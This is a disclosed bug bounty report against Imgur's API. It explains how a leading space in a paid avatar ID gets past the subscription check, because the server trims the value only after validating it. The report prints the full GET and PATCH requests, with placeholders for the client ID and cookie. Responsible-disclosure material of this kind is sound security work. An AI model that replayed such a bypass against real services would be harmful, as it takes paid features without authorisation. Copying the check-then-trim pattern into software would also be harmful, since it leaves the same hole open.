# Bypass subscription

## Report Details
- **Report ID**: 1029027
- **URL**: https://hackerone.com/reports/1029027
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-11-07T14:41:11.355Z
- **Disclosed**: 2020-12-13T17:28:19.982Z

## Reporter
- **Username**: 1a2er3d
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: imgur

## Vulnerability Information
Hello team! You can bypass avatar subscriptions.
Thus, without connecting a subscription - it's free.

A list of all avatars is available at the address below, with a GET request:

```
:method: GET
:authority: api.imgur.com
:scheme: https
:path: /account/v1/accounts/me/avatars?client_id=YOU CLIENT ID
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
dnt: 1
accept: */*
origin: https://imgur.com
sec-fetch-site: same-site
sec-fetch-mode: cors
sec-fetch-dest: empty
referer: https://imgur.com/
accept-encoding: gzip, deflate, br
accept-language: ru,en-US;q=0.9,en;q=0.8,uk;q=0.7
YOU COOKIE

```

But the subscription on the site is paid and without this trick it cannot be bypassed.
We use " " - space in front of the icon name and get paid icon for free.

Below is the request to send

 ```
:method: PATCH
:authority: api.imgur.com
:scheme: https
:path: /account/v1/accounts/me?client_id=YOU CLIENT ID
accept: application/vnd.imgur.v1+json
dnt: 1
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
content-type: application/vnd.imgur.v1+json
origin: https://imgur.com
sec-fetch-site: same-site
sec-fetch-mode: cors
sec-fetch-dest: empty
referer: https://imgur.com/
accept-encoding: gzip, deflate, br
accept-language: ru,en-US;q=0.9,en;q=0.8,uk;q=0.7
YOU COOKIE

Content-Length: 73

{
	"avatar_id": " subscription/spooktober-pumpkin", 
	"id": YOU ID
}
 ```
__Small recommendation __

The point is that you use "TRIM" after checking by name. It turns out TRIM strips the space and it bypasses the check.

**I think this information will be useful to you.**

## Impact

We connect a paid avatar - for free.
Thus, we bypass the subscription.

## Attachments
No attachments
